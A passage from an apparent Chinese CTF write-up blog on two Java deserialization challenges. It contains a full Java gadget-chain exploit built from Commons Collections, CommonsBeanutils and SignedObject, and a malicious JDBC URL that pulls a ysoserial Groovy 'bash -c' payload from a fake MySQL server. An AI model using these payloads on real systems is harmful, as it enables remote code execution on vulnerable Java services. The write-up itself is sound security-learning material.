+<p>也就是<code>com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition</code></p>
+<p>是可以触发JNDI注入的</p>
+<h1 id="鹏城杯2022-ezJava"><a href="#鹏城杯2022-ezJava" class="headerlink" title="鹏城杯2022 | ezJava"></a>鹏城杯2022 | ezJava</h1><p>考点：CB链+二次反序列化<br>初步猜想是用CB+CC的后半段利用链，因为题目CC3和CC4的依赖都给了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680008634517-791c5804-a40c-4ca8-b6d2-98d42f7c0454.png#averageHue=%232f312e&clientId=u484efc1e-d47b-4&from=paste&height=154&id=u6150e885&name=image.png&originHeight=192&originWidth=816&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216416&status=done&style=none&taskId=u4c981b98-4e2f-4f17-8f5e-91ed0d49135&title=&width=652.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680008638917-7490ed74-19bf-4403-a8d9-953f65bc66eb.png#averageHue=%232f2f29&clientId=u484efc1e-d47b-4&from=paste&height=475&id=u4cbf5745&name=image.png&originHeight=594&originWidth=1232&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1028400&status=done&style=none&taskId=uef9bce11-a845-44ab-98bb-ce25b996a3f&title=&width=985.6" alt="image.png"><br>并且只过滤了CC4的chaintransformer，因此我觉得可以接上CB链的compare处进行反序列化，<br>然后我怎么这么笨呢，总是忘掉二次反序列化这东西，这一题可以用SignObject进行二次反序列化绕过<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680010641815-4fc0bfc9-cf98-4cdd-bb3c-fd247f6a7ba6.png#averageHue=%232e2e28&clientId=u9df100b8-f838-4&from=paste&height=471&id=u3d1d9261&name=image.png&originHeight=589&originWidth=1221&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1034351&status=done&style=none&taskId=u4bedc131-45c8-4035-9ded-cfa6029cf61&title=&width=976.8" alt="image.png"><br>入口点给了。那么编写POC.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.transformer.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ezjava_exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap,privateKey,signingEngine);</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;object&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;signedObject, signedObject&#125;);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        Base64Encode(barr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680011568220-a4b12326-46dd-422c-ad2e-487343c8a562.png#averageHue=%23e2c488&clientId=u9df100b8-f838-4&from=paste&height=1116&id=u4b71e1a6&name=image.png&originHeight=1395&originWidth=2430&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=385267&status=done&style=none&taskId=u7657e681-df9c-40e6-8d93-3bd14d89f6d&title=&width=1944" alt="image.png"></p>
+<h1 id="强网拟态2022-ezJava"><a href="#强网拟态2022-ezJava" class="headerlink" title="强网拟态2022 | ezJava"></a>强网拟态2022 | ezJava</h1><p>考点：JDBC之Groovy利用链</p>
+<h2 id="（1）审题"><a href="#（1）审题" class="headerlink" title="（1）审题"></a>（1）审题</h2><p>初步审题其实可以发现是之前ezjaba的revenge版本：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680076725660-7bcb5453-7238-46c9-aad0-0ddadf708af9.png#averageHue=%23282926&clientId=ubaa679c6-0ba6-4&from=paste&height=836&id=u70b8cb16&name=image.png&originHeight=836&originWidth=1665&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1845854&status=done&style=none&taskId=u0e911bba-0f64-4a29-8fc7-1b4ec71d07e&title=&width=1665" alt="image.png"><br>回顾一下JDBC反序列化，最后会接收恶意mysql服务端传输回来的数据，并对其调用原生readObject方法，然后观察这道题的依赖包<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680077538011-03095556-9df2-49e2-9b39-950b079359da.png#averageHue=%23473f34&clientId=u0b2e2078-35ec-4&from=paste&height=62&id=u97c2fa2f&name=image.png&originHeight=62&originWidth=296&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31085&status=done&style=none&taskId=uc224ab7d-17f3-4a85-bbf5-32a04f826e5&title=&width=296" alt="image.png"><br>有个很显眼（我一开始没注意）的groovy，昨天本来是打算学一手这个链子的，可是咕咕了。<br>那就是打JDBC-Groovy了，然后还有几层if需要绕一下，这里看看怎么绕<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680077617692-a91a798f-2f9e-43fc-a6aa-7e9d9d75830b.png#averageHue=%232c2c27&clientId=u0b2e2078-35ec-4&from=paste&height=377&id=ue81104b6&name=image.png&originHeight=377&originWidth=987&originalType=binary&ratio=1&rotation=0&showTitle=false&size=525265&status=done&style=none&taskId=u5163830a-1039-41f1-a6f1-3d6c1151008&title=&width=987" alt="image.png"><br>题目会对URL后面的query进行一次解码，也就是我们可以将<code>AUTODESERIALIZE</code>做一次URL编码即可绕过，剩下的就没啥，就是准备一个恶意mysql服务端，github上有开源的fake_mysql<br>然后Ysoserial准备Groovy的payload，配置如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680078798415-222c5932-ab68-4818-8aa4-768c8367a85b.png#averageHue=%23faf9f7&clientId=u0b2e2078-35ec-4&from=paste&height=511&id=u089cdda4&name=image.png&originHeight=511&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63174&status=done&style=none&taskId=u2ceca5a6-02af-4723-8865-ffd68b8541e&title=&width=884" alt="image.png"><br><code>url=jdbc:mysql://10.92.85.6:3306/test?%2561%2575%2574%256f%2544%2565%2573%2565%2572%2569%2561%256c%2569%257a%2565 =true%26queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%26user=yso_Groovy1_bash -c</code><br>然后这一题为了防止非预期读取&#x2F;flag直接设置了个policy文件让我在本地运行不了。无语<br>那么就云做题了妈的<br>之后就是走到readObject就到Groovy的调用，就写下Groovy链吧</p>
+<h2 id="（2）Groovy链RCE"><a href="#（2）Groovy链RCE" class="headerlink" title="（2）Groovy链RCE"></a>（2）Groovy链RCE</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/vf49yrs9b35p0yaw?view=doc_embed">Groovy反序列化利用链</a></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/Java/" class="tag">#Java</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/29/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Groovy反序列化利用链</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/21/BCEL-ClassLoader%E8%B5%9B%E5%8D%9A%E5%AD%A6%E4%B9%A0/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">BCEL-ClassLoader赛博学习</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
